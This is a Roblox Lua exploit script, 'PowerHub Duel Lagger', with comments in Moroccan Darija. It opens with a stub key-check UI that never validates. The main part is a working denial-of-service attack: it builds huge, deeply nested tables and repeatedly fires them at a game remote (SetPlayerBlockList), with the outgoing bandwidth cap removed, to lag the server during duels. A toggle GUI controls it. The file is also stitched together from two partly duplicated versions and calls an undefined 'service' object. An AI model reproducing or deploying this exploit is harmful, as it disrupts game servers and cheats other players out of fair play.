-- Roblox Security System - Power Hub (Protected)
local Players = service:GetService("Players")
local localPlayer = Players.LocalPlayer

-- Function li kat-vérifi l-key (Rbtha m3a l-API wla l-Database dyalk)
local function verifyKey(inputKey)
    -- Hna k-t-dir l-request l l-API dyal l-keys bash t-chof wach l-key valid wla la
    -- Example: local response = game:HttpGet("https://your-api-url.com/check?key=" .. inputKey)
    local isValid = false -- Ila kan l-key s-sahih rddha true, ila ghalat rddha false
    return isValid
end

-- UI dyal l-Key System (Katla7 l-user bash y-dkhal l-key ila makanch m-vérifi)
local function createKeyUI()
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local TextBox = Instance.new("TextBox")
    local TextButton = Instance.new("TextButton")
    
    ScreenGui.Parent = game.CoreGui
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Frame.Position = UDim2.new(0.5, -125, 0.5, -75)
    Frame.Size = UDim2.new(0, 250, 0, 150)
    
    TextBox.Parent = Frame
    TextBox.PlaceholderText = "Enter your key here..."
    TextBox.Position = UDim2.new(0.1, 0, 0.2, 0)
    TextBox.Size = UDim2.new(0.8, 0, 0, 30)
    
    TextButton.Parent = Frame
    TextButton.Text = "Submit Key"
    TextButton.Position = UDim2.new(0.1, 0, 0.6, 0)
    TextButton.Size = UDim2.new(0.8, 0, 0, 30)
    
    TextButton.MouseButton1Click:Connect(function()
        local userKey = TextBox.Text
        if verifyKey(userKey) then
            ScreenGui:Destroy()
            print("Key Accepted! Loading PowerHub...")
            -- Hna k-t-hott l-code l-asli dyal l-script dyalk
        else
            TextBox.Text = "Invalid Key!"
        end
    end)
end
-- Ila jabo l-loadstring bla key, kat-tla7 lih l-UI dyal l-key awla kay-t-dir lih kick
createKeyUI()
-- POWERHUB ⚡ | duel-lagger & mobile-optimized
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LP = Players.LocalPlayer

-- Zid l-code w l-functions dyal l-lagger wla l-duel dyalk hna l-tahat:
print("PowerHub Loaded Successfully!")
--POWERHUB⚡️|duel-lagger&mobile-optimized
local Players=game:GetService("Players")
local RunService=game:GetService("RunService")
local TweenService=game:GetService("TweenService")
local UserInputService=game:GetService("UserInputService")
local LP=Players.LocalPlayer

local isMobile=UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local LAGGER_CONFIG=isMobile and {
TableIncrease=290,
Tries=1,
LoopWaitTime=0.85
} or {
TableIncrease=265,
Tries=1,
LoopWaitTime=0.05
}

local CUSTOM_REMOTE_PATH="RobloxReplicatedStorage.SetPlayerBlockList"

local function resolveRemote(path)
if not path or path=="" then return nil end
local obj=game
local cleaned=path:gsub("^game%.","")
for segment in cleaned:gmatch("[^%.]+") do
if obj then
obj=obj[segment]
else
return nil
end
end
return obj
end

local function getmaxvalue(val)
local mainvalueifonetable=499999
if type(val)~="number" then return nil end
return mainvalueifonetable/(val+2)
end

local function bomb(tableincrease,tries)
local maintable={}
local spammedtable={}
table.insert(spammedtable,{})
local z=spammedtable[1]
for i=1,tableincrease do
local tableins={}
table.insert(z,tableins)
z=tableins
end
local maximum=getmaxvalue(tableincrease) or 9999999
for i=1,maximum do
table.insert(maintable,spammedtable)
if i%5000==0 then task.wait() end
end
local remote=resolveRemote(CUSTOM_REMOTE_PATH)
if remote then
for i=1,tries do
pcall(function()
if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
remote:FireServer(maintable)
elseif remote:IsA("RemoteFunction") then
remote:InvokeServer(maintable)
end
end)
end
end
end

local laggerEnabled=false
local laggerThread=nil

local function startLaggerLoop()
while laggerEnabled do
pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
task.spawn(function()
bomb(LAGGER_CONFIG.TableIncrease,LAGGER_CONFIG.Tries)
end)
task.wait(math.max(LAGGER_CONFIG.LoopWaitTime,0.15))
end
end

local function stopLaggerLoop()
laggerEnabled=false
if laggerThread then
task.cancel(laggerThread)
laggerThread=nil
end
end

local function startLagger()
if laggerThread then return end
laggerEnabled=true
laggerThread=task.spawn(startLaggerLoop)
end

for _,name in pairs({"PowerHubDuelLagger"}) do
local old=game:GetService("CoreGui"):FindFirstChild(name)
if old then old:Destroy() end
end

local ScreenGui=Instance.new("ScreenGui")
ScreenGui.Name="PowerHubDuelLagger"
ScreenGui.ResetOnSpawn=false
ScreenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder=1000
ScreenGui.IgnoreGuiInset=true
ScreenGui.Parent=game.CoreGui

local Main=Instance.new("Frame")
Main.Name="Main"
Main.Size=UDim2.new(0,160,0,82)
Main.Position=UDim2.new(0,20,0,120)
Main.BackgroundColor3=Color3.fromRGB(0,0,10)
Main.BorderSizePixel=0
Main.Active=true
Main.Draggable=true
Instance.new("UICorner",Main).CornerRadius=UDim.new(0,12)
Main.Parent=ScreenGui

local stroke=Instance.new("UIStroke",Main)
stroke.Color=Color3.fromRGB(0,32,110)
stroke.Thickness=1.5

local Title=Instance.new("TextLabel")
Title.Size=UDim2.new(1,-12,0,22)
Title.Position=UDim2.new(0,10,0,6)
Title.BackgroundTransparency=1
Title.Text="⚡️ POWER HUB⚡️"
Title.TextColor3=Color3.fromRGB(21,55,255)
Title.TextSize=13
Title.Font=Enum.Font.GothamBlack
Title.TextXAlignment=Enum.TextXAlignment.Left
Title.Parent=Main

local ToggleRow=Instance.new("Frame")
ToggleRow.Size=UDim2.new(1,-14,0,36)
ToggleRow.Position=UDim2.new(0,7,0,36)
ToggleRow.BackgroundColor3=Color3.fromRGB(0,0,20)
ToggleRow.BorderSizePixel=0
Instance.new("UICorner",ToggleRow).CornerRadius=UDim.new(0,8)
ToggleRow.Parent=Main

local StatusLabel=Instance.new("TextLabel")
StatusLabel.Size=UDim2.new(1,-50,1,0)
StatusLabel.Position=UDim2.new(0,8,0,0)
StatusLabel.BackgroundTransparency=1
StatusLabel.Text="INACTIVE"
StatusLabel.TextColor3=Color3.fromRGB(100,100,100)
StatusLabel.TextSize=11
StatusLabel.Font=Enum.Font.GothamBold
StatusLabel.TextXAlignment=Enum.TextXAlignment.Left
StatusLabel.Parent=ToggleRow

local PillBg=Instance.new("Frame")
PillBg.Size=UDim2.new(0,44,0,22)
PillBg.Position=UDim2.new(1,-52,0.5,-11)
PillBg.BackgroundColor3=Color3.fromRGB(0,0,40)
PillBg.BorderSizePixel=0
Instance.new("UICorner",PillBg).CornerRadius=UDim.new(1,0)
PillBg.Parent=ToggleRow

local Dot=Instance.new("Frame")
Dot.Size=UDim2.new(0,18,0,18)
Dot.Position=UDim2.new(0,2,0.5,-9)
Dot.BackgroundColor3=Color3.fromRGB(100,100,100)
Dot.BorderSizePixel=0
Instance.new("UICorner",Dot).CornerRadius=UDim.new(1,0)
Dot.Parent=PillBg

local PillHit=Instance.new("TextButton")
PillHit.Size=UDim2.new(1,0,1,0)
PillHit.BackgroundTransparency=1
PillHit.Text=""
PillHit.Parent=PillBg

local RowHit=Instance.new("TextButton")
RowHit.Size=UDim2.new(1,0,1,0)
RowHit.BackgroundTransparency=1
RowHit.Text=""
RowHit.Parent=ToggleRow

local function setLagger(state)
laggerEnabled=state
local tw=TweenInfo.new(0.25,Enum.EasingStyle.Quad)
if laggerEnabled then
TweenService:Create(PillBg,tw,{BackgroundColor3=Color3.fromRGB(0,0,225)}):Play()
TweenService:Create(Dot,tw,{
Position=UDim2.new(1,-20,0.5,-9),
BackgroundColor3=Color3.fromRGB(21,55,255)
}):Play()
StatusLabel.Text="ACTIVE"
StatusLabel.TextColor3=Color3.fromRGB(21,55,255)
startLagger()
else
TweenService:Create(PillBg,tw,{BackgroundColor3=Color3.fromRGB(0,0,40)}):Play()
TweenService:Create(Dot,tw,{
Position=UDim2.new(0,2,0.5,-9),
BackgroundColor3=Color3.fromRGB(100,100,100)
}):Play()
StatusLabel.Text="INACTIVE"
StatusLabel.TextColor3=Color3.fromRGB(100,100,100)
stopLaggerLoop()
end
end

PillHit.MouseButton1Click:Connect(function()
setLagger(not laggerEnabled)
end)

RowHit.MouseButton1Click:Connect(function()
setLagger(not laggerEnabled)
end)

print("✅ POWER HUB⚡️ Duel Lagger Loaded!")
